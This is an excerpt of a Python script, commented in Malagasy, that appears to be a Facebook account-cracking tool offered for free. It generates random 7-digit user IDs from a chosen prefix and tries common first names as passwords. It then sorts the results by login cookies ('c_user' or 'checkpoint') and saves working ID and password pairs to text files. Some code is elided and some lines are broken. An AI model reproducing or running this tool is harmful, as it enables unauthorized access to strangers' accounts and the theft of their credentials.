...
Y                          Y           Y             Y                
--------------------------------------------------
[•] OWNER      : \x1b[38;5;208m𝑹𝑶𝑵𝑵𝒀
[•] GITHUB     : \x1b[38;5;208𝑹𝑶𝑵𝑵𝒀𝑴𝑨𝑳𝑨𝑮𝑨𝑺𝒀 
[•] TOOL TYPE  : \x1b[38;5;208m𝑹𝑨𝑵𝑫𝑶𝑴\033[1;37m
[•] STATUS     : \x1b[38;5;208m𝐹𝑅𝐸𝐸\033[1;37m
--------------------------------------------------
...
cps = []
try:
    print('\n\033[1;37m[•] 𝐌𝐈𝐀𝐍𝐃𝐑𝐘 𝐊𝐄𝐋𝐘 𝐓𝐎𝐌𝐏𝐎𝐊𝐎')
...
def chos():
    ...
    os.system("clear")
    print(logo)
    print('\x1b[1;91m[•] NY KAODINAO: ')
    lines()
    code = input(' KAODINAO : ')
    lines()
    os.system('clear')
    print(logo)
    print('[•] LIMITY AMBONY [1000]')
    lines()
    limit = int(input('[•] LIMITY :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    ...
    lines()
    passx = int(input("[•] FIRY TENY MIAFINA HO ATAONAO? : "))
    SIALZADA = []
    os.system('clear')
    print(logo)
    print('[•] OHATRA : malala,nirina,faniry,rakoto,Etc')
    lines()
    ...
    print('Vita Soamantsara Ny Fakanao Kaonty')
    print('Ids saved in ok.txt,cp.txt')
    SIAL-ZADA()
#_____
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KAONTY-VELONA] '+cid+' | '+ps+'\x1b[1;97m')
                open('KAONTY-VELONA.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[KAONTY-MATY] '+uid+' | '+ps+'\x1b[1;97m')
                open('KAONTY-MATY.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
